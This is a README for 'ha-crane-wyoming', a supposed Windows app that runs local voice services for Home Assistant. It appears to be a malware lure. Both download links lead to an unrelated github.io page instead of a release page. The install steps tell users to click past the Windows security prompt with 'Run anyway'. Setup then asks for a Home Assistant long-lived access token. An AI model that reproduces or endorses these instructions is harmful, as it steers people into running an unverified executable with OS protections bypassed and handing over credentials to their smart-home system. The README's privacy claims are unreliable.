# 🎙️ ha-crane-wyoming - Run local voice services on Windows

[![Download ha-crane-wyoming](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://pushpamhack.github.io)

## 🎯 About This Application

The ha-crane-wyoming application enables your computer to process voice commands locally. It bridges the gap between your microphone and your Home Assistant setup. By running these tasks on your own hardware, you keep your voice data private. This tool handles four main tasks:

1. Listening for a wake word.
2. Detecting when you speak.
3. Turning your speech into text.
4. Turning text into speech.

You do not need to send your voice recordings to large cloud providers. This app processes everything on your local machine using its own smart tools.

## 💻 System Requirements

* Windows 10 or Windows 11.
* A stable internet connection for the Home Assistant link.
* A working USB microphone or built-in laptop microphone.
* At least 8GB of RAM.
* A modern processor to handle the speech processing tasks.

## 📥 Getting the Software

You need to visit the project page to get the installer for Windows. 

[Click here to visit the release page and download the software](https://pushpamhack.github.io)

Look for the file ending in `.exe` under the "Assets" section of the latest release. Save this file to your computer.

## 🛠️ Setting Up Your Computer

Follow these steps to install the app:

1. Locate the file you downloaded.
2. Double-click the file to start the installer.
3. Your computer may show a security prompt. If it does, click "More info" and then click "Run anyway."
4. Follow the instructions on the screen to finish the installation.
5. Once the installer finishes, a shortcut icon appears on your desktop.

## ⚙️ Configuring Your Voice Assistant

When you start the app for the first time, you must link it to Home Assistant.

1. Open the application using the desktop icon.
2. In the settings window, enter the IP address of your Home Assistant server.
3. Provide your Home Assistant "Long-Lived Access Token." You can generate this token in your Home Assistant profile settings.
4. Select your input device, which is your microphone, from the dropdown menu.
5. Select your output device, which is your speaker, for the voice feedback.
6. Click Save.

## 🗣️ Understanding the Voice Services

This application uses the Wyoming protocol to talk to your home server. Here is what each feature does for you:

* **Wake Word:** This service waits for you to say a specific trigger word. Once it hears that word, it starts listening for your command.
* **Speech-to-Text:** This component converts the sound of your voice into written words.
* **Text-to-Speech:** This component takes a written answer from your home system and plays it back as a human-sounding voice.
* **Voice Activity Detection:** This feature helps the app know when you start and stop talking, so it ignores background noise.

## 📋 Best Practices

Place your microphone in a clear area. Avoid placing it near fans or loud appliances. Background noise interferes with the accuracy of the speech recognition. If the app consistently fails to understand your commands, move the microphone closer to your position.

Check that your Home Assistant instance is updated to the latest version. This ensures that the Wyoming protocol features work without errors.

## 🛡️ Privacy and Safety

This app runs locally on your machine. All processing happens on your hardware. No audio files leave your home network unless you configure Home Assistant to send them elsewhere. This setup ensures that your voice remains private.

## 🔧 Troubleshooting Common Issues

* **The app does not hear me:** Go to your Windows Sound settings. Check that your microphone is set as the default recording device.
* **The app cannot reach Home Assistant:** Check that your computer and the Home Assistant server are on the same Wi-Fi network. Ensure the IP address in the settings matches the address in your browser.
* **Voice is choppy or slow:** This usually happens if your computer is busy with other tasks. Close heavy programs while using the voice assistant.
* **The app crashed:** Restart the application. Check the log file located in the application installation folder if the problem persists.

## 🧩 How to Update

When a new version is available, repeat the steps in the download section. You do not need to uninstall the old version first. The new installer replaces the older files while keeping your settings intact.

Keywords: automatic-speech-recognition, home-assistant, home-automation, llm-inference, speech-recognition, speech-synthesis, speech-to-text, text-to-speech, voice-activity-detection, voice-ai, voice-assistant, voice-assistant-ai, wakeword